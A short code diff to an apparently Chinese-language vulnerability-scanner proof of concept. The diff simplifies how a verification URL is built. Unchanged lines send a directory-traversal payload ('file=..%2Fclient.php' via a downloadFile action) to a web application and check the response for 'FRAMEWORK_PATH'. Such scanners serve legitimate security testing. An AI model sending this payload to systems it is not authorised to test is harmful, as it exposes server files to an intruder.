@@ -48,10 +48,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            arg = '{target}'.format(target=self.target)
-            url = arg
             payload = 'm=download&a=downloadFile&file=..%2Fclient.php'
-            verify_url = url + '/new/client.php?%s' % payload
+            verify_url = self.target + '/new/client.php?%s' % payload
             code, head, res, errcode, finalurl = hh.http(verify_url)
 
             if 'FRAMEWORK_PATH' in res:
